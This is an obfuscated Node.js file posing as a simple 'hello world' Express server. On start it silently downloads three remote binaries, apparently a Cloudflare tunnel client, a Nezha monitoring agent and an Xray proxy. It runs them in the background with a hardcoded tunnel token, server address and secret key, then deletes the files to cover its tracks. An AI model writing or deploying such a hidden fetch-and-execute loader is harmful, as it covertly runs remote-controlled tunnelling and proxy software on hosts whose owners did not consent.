function _0x1395(){const _0x5950d7=['925092EcqBpF','child_process','8zPAWDT','GET','ws://localhost:8002','2778MPJZCl','send','env','x64','5288010WjFVhU','https://github.com/seav1/dl/releases/download/files/cf-arm','finish','PORT','status','C_T','55EORmLT','createServer','N_S','pipe','listening\x20on\x20port\x20','SERVER_PORT','https://github.com/seav1/xr/releases/download/latest/xray-linux-arm64','3436dfDjLr','nohup\x20./nz\x20-s\x20','3841692OoTLZX','https://github.com/seav1/xr/releases/download/latest/xray-linux-amd64','length','axios','91601FuvEYr','3659835aYqPhR','\x20--tls\x20--disable-auto-update\x20--skip-procs\x20--skip-conn\x20>/dev/null\x202>&1\x20&','https://github.com/seav1/dl/releases/download/files/nz','N_K','4098114xoNNEz','unlink','get','48uxwsap','http',':443\x20-p\x20','6nleMGu','silent','https://github.com/seav1/dl/releases/download/files/cf','listen','\x20--url\x20http://localhost:8002\x20>/dev/null\x202>&1\x20&','hello\x20world','express','createWriteStream','data','chmod\x20+x\x20./','https://github.com/seav1/dl/releases/download/files/nz-arm'];_0x1395=function(){return _0x5950d7;};return _0x1395();}const _0x46de0e=_0x475f;(function(_0x415412,_0x48c08e){const _0x5e009e=_0x475f,_0x7dcd4a=_0x415412();while(!![]){try{const _0x392e52=-parseInt(_0x5e009e(0x83))/0x1*(parseInt(_0x5e009e(0x9b))/0x2)+parseInt(_0x5e009e(0x9e))/0x3*(-parseInt(_0x5e009e(0xaf))/0x4)+-parseInt(_0x5e009e(0x84))/0x5*(-parseInt(_0x5e009e(0x8e))/0x6)+-parseInt(_0x5e009e(0x99))/0x7*(parseInt(_0x5e009e(0x8b))/0x8)+-parseInt(_0x5e009e(0x88))/0x9+parseInt(_0x5e009e(0xa2))/0xa+parseInt(_0x5e009e(0xa8))/0xb*(parseInt(_0x5e009e(0xb1))/0xc);if(_0x392e52===_0x48c08e)break;else _0x7dcd4a['push'](_0x7dcd4a['shift']());}catch(_0x750f28){_0x7dcd4a['push'](_0x7dcd4a['shift']());}}}(_0x1395,0x6e319));const C_T=process[_0x46de0e(0xa0)][_0x46de0e(0xa7)]||'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYzYyMTE0ZGYtYWYwZC00YTU2LWE1NjctMjM3NDdjMmI0M2ExIiwicyI6Ik5XWXlZakkxWVRndE5UUXpaQzAwTjJGa0xUaGxabVV0WVRReU1HWmlOMkl3T0dVeSJ9',N_S=process[_0x46de0e(0xa0)][_0x46de0e(0xaa)]||'nz.seav.eu.org',N_K=process[_0x46de0e(0xa0)][_0x46de0e(0x87)]||'mTP8qwlGOuWO8c3TsV',port=process[_0x46de0e(0xa0)][_0x46de0e(0xad)]||process[_0x46de0e(0xa0)][_0x46de0e(0xa5)]||0xbb8,axios=require(_0x46de0e(0x82)),fs=require('fs'),{exec}=require(_0x46de0e(0x9a)),express=require(_0x46de0e(0x94)),{createProxyMiddleware}=require('http-proxy-middleware'),http=require(_0x46de0e(0x8c)),app=express(),URLS_x86_64=[_0x46de0e(0x90),_0x46de0e(0x86),_0x46de0e(0xb2)],URLS_arm=[_0x46de0e(0xa3),_0x46de0e(0x98),_0x46de0e(0xae)],FILES=['cf','nz','xr'],downloadFile=async(_0x5c248f,_0x4005cd)=>{const _0x1f34e4=_0x46de0e,_0x105c66=fs[_0x1f34e4(0x95)]('./'+_0x4005cd),_0x4569d4=await axios({'url':_0x5c248f,'method':_0x1f34e4(0x9c),'responseType':'stream'});return _0x4569d4[_0x1f34e4(0x96)][_0x1f34e4(0xab)](_0x105c66),new Promise(_0x3a663e=>{const _0x522df9=_0x1f34e4;_0x105c66['on'](_0x522df9(0xa4),_0x3a663e);});},executeCommand=_0x557db7=>{return new Promise(_0x585699=>{exec(_0x557db7,()=>{_0x585699();});});},deleteFiles=()=>{FILES['forEach'](_0x58fbd6=>{const _0x50ecc0=_0x475f;fs[_0x50ecc0(0x89)]('./'+_0x58fbd6,()=>{});});},main=async()=>{const _0x3894ba=_0x46de0e,_0x1f6c60=process['arch']===_0x3894ba(0xa1)?URLS_x86_64:URLS_arm;for(let _0x95f953=0x0;_0x95f953<_0x1f6c60[_0x3894ba(0xb3)];_0x95f953++){await downloadFile(_0x1f6c60[_0x95f953],FILES[_0x95f953]),await executeCommand(_0x3894ba(0x97)+FILES[_0x95f953]);}await executeCommand('nohup\x20./cf\x20tunnel\x20--edge-ip-version\x20auto\x20run\x20--protocol\x20http2\x20--no-autoupdate\x20--token\x20'+C_T+_0x3894ba(0x92)),await executeCommand(_0x3894ba(0xb0)+N_S+_0x3894ba(0x8d)+N_K+_0x3894ba(0x85)),await executeCommand('nohup\x20./xr\x20>/dev/null\x202>&1\x20&'),deleteFiles();};main(),app[_0x46de0e(0x8a)]('/',(_0x3f0da0,_0x1adb11)=>{const _0x399e77=_0x46de0e;_0x1adb11[_0x399e77(0xa6)](0xc8)[_0x399e77(0x9f)](_0x399e77(0x93));});function _0x475f(_0x2850ac,_0x23dba2){const _0x139584=_0x1395();return _0x475f=function(_0x475f1c,_0x2cafd0){_0x475f1c=_0x475f1c-0x82;let _0x5e713c=_0x139584[_0x475f1c];return _0x5e713c;},_0x475f(_0x2850ac,_0x23dba2);}const server=http[_0x46de0e(0xa9)](app);server['on']('upgrade',createProxyMiddleware({'target':_0x46de0e(0x9d),'changeOrigin':!![],'ws':!![],'logLevel':_0x46de0e(0x8f)})),server[_0x46de0e(0x91)](port,()=>{const _0x4f3ea9=_0x46de0e;console['log'](_0x4f3ea9(0xac)+port);});
